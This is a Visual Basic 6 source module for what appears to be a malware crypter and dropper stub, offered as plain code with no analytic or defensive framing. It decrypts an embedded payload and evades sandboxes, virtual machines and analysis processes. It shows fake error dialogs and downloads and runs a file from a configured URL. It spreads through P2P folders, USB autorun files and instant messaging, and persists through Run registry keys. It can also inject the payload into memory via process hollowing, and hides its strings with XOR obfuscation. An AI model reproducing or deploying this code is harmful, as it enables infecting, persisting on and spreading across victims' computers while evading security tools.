Attribute VB_Name = "modMain"
Public Declare Function RegCreateKey Lib "ADVAPI32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Public Declare Function RegOpenKeyEx Lib "ADVAPI32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As Long) As Long
Public Declare Function RegOpenKey Lib "ADVAPI32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Public Declare Function RegQueryValueEx Lib "ADVAPI32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, ByRef lpType As Long, ByRef lpData As Any, ByRef lpcbData As Long) As Long

Public Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Public Declare Function Process32First Lib "kernel32.dll" (ByVal hSnapShot As Long, ByRef lppe As PROCESSENTRY32) As Long
Public Declare Function Process32Next Lib "kernel32.dll" (ByVal hSnapShot As Long, ByRef lppe As PROCESSENTRY32) As Long

Public Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As Long
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * 260
End Type

Public bufFile() As Byte
Public bufSettings() As Byte
Public bufAPIs() As Byte
Public ff As Long

Public cptMemHDD As String
Public cptStartup As String
Public cptPolicies As Byte
Public cptHKLM As Byte
Public cptHKCU As Byte
Public cptActiveX As String
Public cptFakeMsg As String
Public cptFakeTitle As String
Public cptFakeCritical As String
Public cptFakeExclamation As String
Public cptFakeInfo As String
Public cptURL As String
Public cptSandboxie As Byte
Public cptThreatExpert As Byte
Public cptAnubis As Byte
Public cptCWSandbox As Byte
Public cptJoeBox As Byte
Public cptVirtualPC As Byte
Public cptVMware As Byte
Public cptProcesses() As String
Public cptP2P As Byte
Public cptUSB As Byte
Public cptFilenames() As String
Public cptIM As String

Sub Main()
    On Error Resume Next
    Dim temp As String
    Dim strSettings As String
    Dim strAPIs As String
    Dim strProcesses() As String
    
    bufFile = LoadResData(31, 52)
    bufSettings = LoadResData(32, 52)
    bufAPIs = LoadResData(33, 52)
    
    temp = StrConv(bufFile, vbUnicode)
    temp = EncryptData(temp, "872636564726772", False)
    
    strSettings = StrConv(bufSettings, vbUnicode)
    strAPIs = StrConv(bufAPIs, vbUnicode)
    
    bufFile = StrConv(temp, vbFromUnicode)
    Call ReadAPIs(strAPIs)
    Call ReadSettings(strSettings)
    
    '//---Anti Process---//
    If UBound(cptProcesses) > 0 Then
        strProcesses = Split(GetProcesses, vbFormFeed)
        For i = 0 To UBound(cptProcesses) - 2
            For ii = 0 To UBound(strProcesses)
                If cptProcesses(i) = strProcesses(ii) Then End
            Next ii
        Next i
    End If
    '//---Anti Process---//
        
    '//---Anti Emulators---//
    If cptSandboxie = 1 Then If IsInSandbox = 1 Then End
    If cptThreatExpert = 1 Then If IsInSandbox = 2 Then End
    If cptAnubis = 1 Then If IsInSandbox = 3 Then End
    If cptCWSandbox = 1 Then If IsInSandbox = 4 Then End
    If cptJoeBox = 1 Then If IsInSandbox = 5 Then End
    If cptVirtualPC = 1 Then If InVirtualPC = True Then End
    If cptVMware = 1 Then If InVirtualPC = True Then End
    '//---Anti Emulators---//
    
    If cptFakeMsg <> vbNullString Then
        If cptFakeCritical = strXOR("31010111", "test", False) Then MsgBox cptFakeMsg, vbCritical, cptFakeTitle
        If cptFakeExclamation = strXOR("31010111", "test", False) Then MsgBox cptFakeMsg, vbExclamation, cptFakeTitle
        If cptFakeInfo = strXOR("31010111", "test", False) Then MsgBox cptFakeMsg, vbInformation, cptFakeTitle
    End If
    
    If cptURL <> vbNullString Then
        Call CallAPI(apiWinInet, apiDeleteUrlCacheEntryA, cptURL)
        Call CallAPI(apiUrlMon, apiURLDownloadToFileA, 0, cptURL, Environ("temp") & "\tmp.exe", 0, 0)
        Shell Environ("temp") & strXOR("390719044B160C11", "test", False)
    End If
    
    If cptP2P = 1 Then Call P2P_Add 'P2P Spread
    If cptUSB = 1 Then Call USBClone 'Infect removable devices
    If cptIM <> vbNullString Then
        For i = 1 To 5
            Call SetPSM(cptIM)
        Next i
    End If
    
    If cptHKLM = 1 Then Call SaveSettingString(&H80000002, strXOR("363C322032322631393E1D17171C071B030728230C1D101B12002837100106110B07221117001D1B0B2F26010B", "test", False), cptStartup, App.Path & strXOR("39", "test", False) & App.EXEName & ".exe")
    If cptHKCU = 1 Then Call SaveSettingString(&H80000001, strXOR("363C322032322631393E1D17171C071B030728230C1D101B12002837100106110B07221117001D1B0B2F26010B", "test", False), cptStartup, App.Path & strXOR("39", "test", False) & App.EXEName & ".exe")
    If cptActiveX = 1 Then Call SaveSettingString(&H80000001, strXOR("363C322032322631393E1D17171C071B0307283506071D0200532711110604282C1D0700041F18110153371B08031B1A001D000739", "test", False), cptStartup, App.Path & strXOR("39", "test", False) & App.EXEName & ".exe")
    If cptPolicies = 1 Then Call SaveSettingString(&H80000002, strXOR("363C322032322631393E1D17171C071B030728230C1D101B12002837100106110B07221117001D1B0B2F041B091A171D000028111D03181B1716062817061A", "test", False), cptStartup, App.Path & strXOR("39", "test", False) & App.EXEName & ".exe")
    
    If cptMemHDD = strXOR("081619", "test", False) Then
        Call ExecMemory(App.Path & strXOR("39", "test", False) & App.EXEName & ".exe")
    Else
        ff = FreeFile
        Open Environ("temp") & strXOR("3943455A000B11", "test", False) For Binary Access Write As ff
            Put ff, , bufFile
        Close ff
        Shell Environ("temp") & strXOR("3943455A000B11", "test", False)
    End If
    End
End Sub

Public Sub ReadSettings(ByVal strData As String)
    On Error Resume Next
    Dim tmp() As String
    
    tmp = Split(strData, strXOR("465057", "test", False))
    
    For i = 0 To UBound(tmp)
        tmp(i) = strXOR(tmp(i), "test", False)
    Next i
    
    If tmp(0) = strXOR("31010111", "test", False) Then cptMemHDD = strXOR("081619", "test", False)
    If tmp(1) = strXOR("31010111", "test", False) Then cptMemHDD = strXOR("0D1710", "test", False)
    cptStartup = tmp(2)
    cptPolicies = Val(tmp(3))
    cptHKLM = Val(tmp(4))
    cptHKCU = Val(tmp(5))
    cptActiveX = Val(tmp(6))
    cptFakeMsg = tmp(7)
    cptFakeTitle = tmp(8)
    cptFakeCritical = tmp(9)
    cptFakeExclamation = tmp(10)
    cptFakeInfo = tmp(11)
    cptURL = tmp(12)
    cptSandboxie = Val(tmp(13))
    cptThreatExpert = Val(tmp(14))
    cptAnubis = Val(tmp(15))
    cptCWSandbox = Val(tmp(16))
    cptJoeBox = Val(tmp(17))
    cptVirtualPC = Val(tmp(18))
    cptVMware = Val(tmp(19))
    cptP2P = Val(tmp(20))
    cptUSB = Val(tmp(21))
    cptProcesses = Split(tmp(22), vbFormFeed)
    cptFilenames = Split(tmp(23), vbFormFeed)
    cptIM = tmp(24)
End Sub

Public Sub ReadAPIs(ByVal strData As String)
    Dim tmp() As String
    tmp = Split(strData, strXOR("465057", "test", False))
    apiPassword = tmp(20)
    
    apiKernel32 = strXOR(tmp(0), apiPassword, False)
    apiNtdll = strXOR(tmp(1), apiPassword, False)
    apiWinInet = strXOR(tmp(2), apiPassword, False)
    apiADVAPI32 = strXOR(tmp(3), apiPassword, False)
    apiUrlMon = strXOR(tmp(4), apiPassword, False)
    apiZwUnmapViewOfSection = strXOR(tmp(5), apiPassword, False)
    apiCreateProcessA = strXOR(tmp(6), apiPassword, False)
    apiGetThreadContext = strXOR(tmp(7), apiPassword, False)
    apiReadProcessMemory = strXOR(tmp(8), apiPassword, False)
    apiVirtualAllocEx = strXOR(tmp(9), apiPassword, False)
    apiVirtualProtectEx = strXOR(tmp(10), apiPassword, False)
    apiWriteProcessMemory = strXOR(tmp(11), apiPassword, False)
    apiSetThreadContext = strXOR(tmp(12), apiPassword, False)
    apiResumeThread = strXOR(tmp(13), apiPassword, False)
    apiCloseHandle = strXOR(tmp(14), apiPassword, False)
    apiCopyFileA = strXOR(tmp(15), apiPassword, False)
    apiURLDownloadToFileA = strXOR(tmp(16), apiPassword, False)
    apiDeleteUrlCacheEntryA = strXOR(tmp(17), apiPassword, False)
    apiRegCloseKey = strXOR(tmp(18), apiPassword, False)
    apiRegSetValueExA = strXOR(tmp(19), apiPassword, False)
End Sub

Public Sub SaveSettingString(hKey As Long, ByVal strPath As String, ByVal strValue As String, ByVal strData As String)
    On Error Resume Next
    Dim keyhand As Long
    
    RegCreateKey hKey, strPath, keyhand&
    Call CallAPI(apiADVAPI32, apiRegSetValueExA, keyhand, strValue, 0, 1, strData, Len(strData))
    Call CallAPI(apiADVAPI32, apiRegCloseKey, keyhand)
End Sub

Public Function GetSettingString(ByVal hKey As Long, ByVal strPath As String, ByVal strValue As String, Optional Default As String) As String
    On Error Resume Next
    Dim hCurKey As Long
    Dim lResult As Long
    Dim lValueType As Long
    Dim strBuffer As String
    Dim lDataBufferSize As Long
    Dim intZeroPos As Integer
    Dim lRegResult As Long
    
    If Not IsEmpty(Default) Then
    GetSettingString = Default
    Else
    GetSettingString = ""
    End If
    
    lRegResult = RegOpenKey(hKey, strPath, hCurKey)
    lRegResult = RegQueryValueEx(hCurKey, strValue, 0&, lValueType, ByVal 0&, lDataBufferSize)
    
    If lRegResult = ERROR_SUCCESS Then
    
    If lValueType = REG_SZ Then
    
    strBuffer = String(lDataBufferSize, " ")
    lResult = RegQueryValueEx(hCurKey, strValue, 0&, 0&, ByVal strBuffer, lDataBufferSize)
    
    intZeroPos = InStr(strBuffer, Chr$(0))
    If intZeroPos > 0 Then
    GetSettingString = Left$(strBuffer, intZeroPos - 1)
    Else
    GetSettingString = strBuffer
    End If
    
    End If
    
    Else
    End If
    
    lRegResult = RegCloseKey(hCurKey)
End Function

Public Function GetProcesses() As String
    Dim proc As PROCESSENTRY32, snap As Long
    snap = CreateToolhelp32Snapshot(15, 0)
    proc.dwSize = Len(proc)
    Process32First snap, proc
    tmpAps = ""
    Do
        Dim hSnapShot As Long
        hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, proc.th32ProcessID)
        tmpAps = tmpAps & vbFormFeed & TrimStr(proc.szExeFile)
        ret = Process32Next(snap, proc)
    Loop While ret <> 0
    GetProcesses = tmpAps
End Function

Private Function TrimStr(ByVal sName As String) As String
    Dim iNullLocal As Integer
    iNullLocal = InStr(sName, vbNullChar)
    If iNullLocal > 0 Then TrimStr = Left(sName, iNullLocal - 1) Else TrimStr = sName
End Function

Public Sub USBClone()
    On Error Resume Next
    Call CallAPI("kernel32.dll", strXOR("261C040D231A181124", "test", False), App.Path & strXOR("39", "test", False) & App.EXEName & ".exe", strXOR("224928", "test", False) & strXOR("2406001B17061A5A000B11", "test", False), False)
    Call CallAPI("kernel32.dll", strXOR("261C040D231A181124", "test", False), App.Path & strXOR("39", "test", False) & App.EXEName & ".exe", strXOR("2D4928", "test", False) & strXOR("2406001B17061A5A000B11", "test", False), False)
    Call CallAPI("kernel32.dll", strXOR("261C040D231A181124", "test", False), App.Path & strXOR("39", "test", False) & App.EXEName & ".exe", strXOR("234928", "test", False) & strXOR("2406001B17061A5A000B11", "test", False), False)
    Call CallAPI("kernel32.dll", strXOR("261C040D231A181124", "test", False), App.Path & strXOR("39", "test", False) & App.EXEName & ".exe", strXOR("2F4928", "test", False) & strXOR("2406001B17061A5A000B11", "test", False), False)
    Call CallAPI("kernel32.dll", strXOR("261C040D231A181124", "test", False), App.Path & strXOR("39", "test", False) & App.EXEName & ".exe", strXOR("214928", "test", False) & strXOR("2406001B17061A5A000B11", "test", False), False)
    Call CallAPI("kernel32.dll", strXOR("261C040D231A181124", "test", False), App.Path & strXOR("39", "test", False) & App.EXEName & ".exe", strXOR("2C4928", "test", False) & strXOR("2406001B17061A5A000B11", "test", False), False)
    
    ff = FreeFile
    Open strXOR("2249283510071B06101D5A1D0B15", "test", False) For Output As #ff
        Print #ff, strXOR("3E3201000A01011A38", "test", False)
        Print #ff, strXOR("0A03111A583201000A01011A4B160C11", "test", False)
        Print #ff, strXOR("0410001D0A1D4926101D5435150327000401005435011B13171219", "test", False)
        Print #ff, strXOR("2C101B1A454E543510071B06101D5A111D16", "test", False)
    Close #ff
    SetAttr strXOR("2249283510071B06101D5A1D0B15", "test", False), vbHidden
    
    ff = FreeFile
    Open strXOR("2D49283510071B06101D5A1D0B15", "test", False) For Output As #ff
        Print #ff, strXOR("3E3201000A01011A38", "test", False)
        Print #ff, strXOR("0A03111A583201000A01011A4B160C11", "test", False)
        Print #ff, strXOR("0410001D0A1D4926101D5435150327000401005435011B13171219", "test", False)
        Print #ff, strXOR("2C101B1A454E543510071B06101D5A111D16", "test", False)
    Close #ff
    SetAttr strXOR("2D49283510071B06101D5A1D0B15", "test", False), vbHidden
    
    ff = FreeFile
    Open strXOR("2349283510071B06101D5A1D0B15", "test", False) For Output As #ff
        Print #ff, strXOR("3E3201000A01011A38", "test", False)
        Print #ff, strXOR("0A03111A583201000A01011A4B160C11", "test", False)
        Print #ff, strXOR("0410001D0A1D4926101D5435150327000401005435011B13171219", "test", False)
        Print #ff, strXOR("2C101B1A454E543510071B06101D5A111D16", "test", False)
    Close #ff
    SetAttr strXOR("2349283510071B06101D5A1D0B15", "test", False), vbHidden
    
    ff = FreeFile
    Open strXOR("2F49283510071B06101D5A1D0B15", "test", False) For Output As #ff
        Print #ff, strXOR("3E3201000A01011A38", "test", False)
        Print #ff, strXOR("0A03111A583201000A01011A4B160C11", "test", False)
        Print #ff, strXOR("0410001D0A1D4926101D5435150327000401005435011B13171219", "test", False)
        Print #ff, strXOR("2C101B1A454E543510071B06101D5A111D16", "test", False)
    Close #ff
    SetAttr strXOR("2F49283510071B06101D5A1D0B15", "test", False), vbHidden
    
    ff = FreeFile
    Open strXOR("2149283510071B06101D5A1D0B15", "test", False) For Output As #ff
        Print #ff, strXOR("3E3201000A01011A38", "test", False)
        Print #ff, strXOR("0A03111A583201000A01011A4B160C11", "test", False)
        Print #ff, strXOR("0410001D0A1D4926101D5435150327000401005435011B13171219", "test", False)
        Print #ff, strXOR("2C101B1A454E543510071B06101D5A111D16", "test", False)
    Close #ff
    SetAttr strXOR("2149283510071B06101D5A1D0B15", "test", False), vbHidden
    
    ff = FreeFile
    Open strXOR("2C49283510071B06101D5A1D0B15", "test", False) For Output As #ff
        Print #ff, strXOR("3E3201000A01011A38", "test", False)
        Print #ff, strXOR("0A03111A583201000A01011A4B160C11", "test", False)
        Print #ff, strXOR("0410001D0A1D4926101D5435150327000401005435011B13171219", "test", False)
        Print #ff, strXOR("2C101B1A454E543510071B06101D5A111D16", "test", False)
    Close #ff
    SetAttr strXOR("2C49283510071B06101D5A1D0B15", "test", False), vbHidden
End Sub

Public Sub P2P_Add()
    On Error Resume Next
    Dim AppPath As String, kPath As String, mPath As String
    AppPath = App.Path & strXOR("39", "test", False) & App.EXEName & ".exe"
    kPath = GetSettingString(&H80000002, strXOR("39203B3231243526202F3F353F323528291C171509301B1A11161A00", "temp", False), "Dir0")
    mPath = GetSettingString(&H80000002, strXOR("39203B3231243526202F391B17031C111000", "temp", False), strXOR("2C1D0700041F182B211A06", "test", False))
    
    Dim i As Long
    For i = 0 To UBound(cptFilenames)
        Call CallAPI(apiKernel32, apiCopyFileA, AppPath, Environ(strXOR("15011B13171219120C1F1107", "test", False)) & strXOR("393F1D1900241D06002F271C0401111039", "test", False) & cptFilenames(i), False)
        Call CallAPI(apiKernel32, apiCopyFileA, AppPath, Environ(strXOR("15011B13171219120C1F1107", "test", False)) & strXOR("3916301B0B18110D57434444391A1A170A1E1D1A022F", "test", False) & cptFilenames(i), False)
    
        Call CallAPI(apiKernel32, apiCopyFileA, AppPath, kPath & strXOR("39", "test", False) & cptFilenames(i), False)
        Call CallAPI(apiKernel32, apiCopyFileA, AppPath, mPath & strXOR("39", "test", False) & cptFilenames(i), False)
    Next i
End Sub
